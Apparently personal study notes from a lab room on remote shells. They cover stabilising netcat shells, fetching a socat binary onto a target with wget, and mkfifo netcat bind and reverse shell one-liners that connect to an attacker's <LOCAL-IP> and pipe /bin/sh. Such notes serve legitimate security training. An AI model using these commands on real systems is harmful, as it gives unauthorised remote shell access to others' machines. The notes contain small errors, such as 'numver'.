# What the Shell 
## Netcat Shell Stabilisation  
### Technique 1: Python  
command:  
```
step 1: python -c 'import pty;pty.spawn("/bin/bash")'  

step 2: export TERM=xterm  

step 3: stty raw -echo; fg  
```
### Technique 2: rlwrap  
command: 
```
rlwrap nc -lvnp <port>  //background the shell with Ctrl + Z, then use stty raw -echo; fg to stabilise and re-enter the shell
```
### Technique 3: Socat  

command： 
```
sudo python3 -m http.server 80
wget <LOCAL-IP>/socat -O /tmp/socat  //download socat static compiled binary in target 

stty -a //note rows and columns in own terminal 

stty rows number   //set in shell 
stty cols numver   //set in shell 
```
### Socat Encrypted Shells 
### Common Shell Payloads 

a bit of vague***   

command:  
```
mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f   //a bit of hard, but don't worry

mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```
[PayloadAllTheThing](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)